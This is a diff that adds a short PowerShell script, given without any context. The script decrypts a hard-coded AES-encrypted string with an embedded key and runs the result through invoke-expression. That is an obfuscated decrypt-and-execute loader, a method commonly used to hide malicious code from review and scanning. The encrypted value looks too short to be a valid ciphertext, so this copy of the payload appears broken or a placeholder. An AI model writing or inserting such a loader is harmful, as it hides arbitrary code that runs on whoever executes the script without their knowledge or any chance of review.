@@ -1,0 +1,13 @@
+$key = "94cc69c50c1127d3b92b02d337ee0a12";
+$encryptedStringWithIV = "27be98bddb174289834e8a6541950d73";
+$aesManaged = New-Object "System.Security.Cryptography.AesManaged";
+$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC;
+$aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7; 
+$aesManaged.BlockSize = 128;
+$aesManaged.KeySize = 128;
+$aesManaged.Key = [System.Text.Encoding]::UTF8.GetBytes($key); 
+$bytes = [System.Convert]::FromBase64String($encryptedStringWithIV);
+$aesManaged.IV = $bytes[0..15];
+$unencryptedData = [System.Text.Encoding]::UTF8.GetString($aesManaged.CreateDecryptor().TransformFinalBlock($bytes, 16, $bytes.Length - 16)).Trim([char]0);
+$aesManaged.Dispose();
+invoke-expression $unencryptedData;
